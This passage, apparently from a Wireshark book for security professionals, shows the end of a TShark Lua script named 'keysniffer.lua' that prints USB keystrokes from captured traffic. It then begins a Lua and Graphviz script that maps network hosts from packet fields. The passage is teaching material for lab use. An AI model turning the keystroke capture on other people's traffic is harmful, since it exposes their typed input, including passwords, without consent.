></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section302" ><p class=MsoBodyText  style="margin-top:3.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Because we are printing the keys as we go along, we don&#8217;t need to put any functionality in the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Listener.draw()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-4.0000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >function:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:11.7500pt;margin-right:178.7000pt;margin-left:65.5500pt;text-indent:-57.6000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--this is called when capture is reset function tap.reset()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:94.3000pt;text-indent:0.0000pt;text-align:left;line-height:13.3000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >print("[*] Done Capturing")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0500pt;margin-right:114.0000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--function called at the end of tshark run function tap.draw()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:94.3000pt;text-indent:0.0000pt;text-align:left;line-height:13.3000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >print("\n\n[*] Done Processing")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >init_listener()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:10.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Save this code as </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >keysniffer.lua</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Let&#8217;s take a crack at running it on our Kali VM and try pressing some keys on our USB keyboard. You will want to make sure you switch out from the terminal window so that any key presses you make don&#8217;t go to that window. You should</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >get something similar to<a name="_bookmark585" ></a>&nbsp;</span><span><a href="#_bookmark586" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-0.2500pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >7-17</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="780"  height="373"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker381569.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.8000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark586" ></a><span><a href="#_bookmark585" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-17:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >TShark key sniffer</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:16.5000pt;" ><o:p>&nbsp;</o:p></span></p><h2 style="margin-top:0.0500pt;" ><a name="Graphing the Network" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="_bookmark587" ></a>Graphing the Network</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;" ><a name="_bookmark588" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Wireshark comes with some graphing capabilities and has a whole</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section303" ><p class=MsoBodyText  style="margin-top:3.5500pt;margin-right:11.1500pt;line-height:101%;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >slew of options under the statistics section from the main screen. These are generally geared, however, toward network troubleshooting and fine-grained analysis.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.3000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Penetration testers often find themselves sitting on unfamiliar networks with the need to quickly determine what the network looks like. Other security professionals might also need to analyze connections being made from a packet capture sample.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We naturally understand a foreign network more quickly if given a visual representation. And a graphic network diagram easily paints the &#8220;big picture,&#8221; if you pardon the metaphor. As such, graphs can be an excellent way to quickly consume information and determine the connection between various machines. Pentesters have a number of tools to accomplish this, but we can at least demonstrate how to add Wireshark to that list of tools.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To map out a network, there is one striking difference to using Wireshark as opposed to more common tools. With Wireshark, you know the network is being represented by actual traffic, not from a storm of probes or ping packets. Using Wireshark, your network map shows the active devices, not latent devices or honeypots (enticing hosts, available only to those who search them out). While seeing only active devices might not be a complete picture, some professionals might find it more representative of the actual working network.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.3000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Lua with Graphviz Library</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><a name="_bookmark589" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This will again be an early session with Lua, the script language. To accomplish this network mapping with Wireshark, we move from the graphical user interface of Wireshark and instead use the command- line interface TShark, along with Lua and the open source Graphviz visualization library. Apart from this script, the book saves the majority of Lua work for </span><span><a href="#_bookmark601" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 8</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We want to be able to visualize the connections being made between machines. This can give us insight into various patterns, such as which machines may be infected, which servers are domain controllers, and so on. We can use TShark to work out the various connections between machines, and then use the Graphviz library for Lua to render it into a</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section304" ><p class=MsoBodyText  style="margin-top:3.8000pt;margin-right:9.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >nice graph showing the connected nodes. First, we need to figure out which fields from the packet we are going to be interested in. The</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.1000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >most obvious ones are the source and destination IP addresses. These will be our nodes. Then we can use both TCP and UDP port numbers as a way of determining the connections between these nodes. The connections between nodes are generally referred to as </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >edges</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. The algorithm we are going to use is that for each TCP stream we want to pull the source and destination IP addresses and the corresponding port numbers. Then, in our </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >tap.draw() </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >function, we connect each node. The nice thing about the Graphviz library is that it can output to various formats. Because we are going to be using tooltips and other features, we are going to stick with SVG format for this example. SVG is also handy in that it can be embedded in a web page. In fact, we will use the Kali Iceweasel browser to view our SVG graph generated by TShark and</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Lua.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The following code shows the graphing solution:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.2500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >do</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local gv = require("gv")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0500pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--helper function for to check if element is in table</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:114.0000pt;margin-left:8.0000pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--</span><span><a href="http://stackoverflow.com/questions/2282444/" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >http://stackoverflow.com/questions/2282444/</span></a></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&nbsp;how-to-check-if-a-table-contains-an-element-in-lua</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:149.7500pt;margin-left:65.5500pt;text-indent:-28.8000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >function table.contains(table, element) for _, value in pairs(table) do</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:215.8500pt;margin-left:123.1000pt;text-indent:-28.8000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if value == element then return true</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:94.3000pt;text-indent:0.0000pt;text-align:left;line-height:13.2000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.4500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >return false</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:207.6000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--end of table.contains function end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:11.1500pt;margin-left:15.1500pt;text-indent:21.5500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- <a name="_bookmark590" ></a>we want the src of the arp packet (remember arp doesn't have an IP header)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local tcp_stream = Field.new("tcp.stream")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0500pt;margin-right:114.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--get the eth and ip src so we can map them local eth_src = Field.new("eth.src")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local ip = Field.new("ip")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section305" ><p class=MsoNormal  style="margin-top:3.7500pt;margin-right:178.7000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local ip_src = Field.new("ip.src") local ip_dst = Field.new("ip.dst")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0500pt;margin-right:178.7000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--we can do basic service analysis local tcp = Field.new("tcp")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:145.3500pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local tcp_src = Field.new("tcp.srcport") local tcp_dst = Field.new("tcp.dstport")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local udp = Field.new("udp")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:145.3500pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local udp_src = Field.new("udp.srcport") local udp_dst = Field.new("udp.dstport")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  